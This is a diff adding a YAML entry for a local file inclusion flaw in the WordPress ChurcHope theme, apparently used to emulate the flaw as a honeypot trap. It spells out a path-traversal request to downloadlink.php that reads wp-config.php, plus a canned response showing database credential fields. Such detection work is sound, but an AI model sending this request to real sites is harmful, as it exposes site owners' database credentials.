@@ -1,0 +1,26 @@
+id: churchope-lfi
+info:
+  name: WordPress ChurcHope Theme <= 2.1 - Local File Inclusion
+  author: dhiyaneshDK
+  description: WordPress ChurcHope Theme <= 2.1 is susceptible to local file inclusion.
+    The vulnerability is caused by improper filtration of user-supplied input passed
+    via the 'file' HTTP GET parameter to the '/lib/downloadlink.php' script, which
+    is publicly accessible.
+  severity: high
+  reference:
+  - https://wpscan.com/vulnerability/3c5833bd-1fe0-4eba-97aa-7d3a0c8fda15
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: wp,wpscan,wordpress,wp-theme,lfi
+traps:
+- request:
+    method: GET
+    path: /wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: DB_NAMEDB_PASSWORD
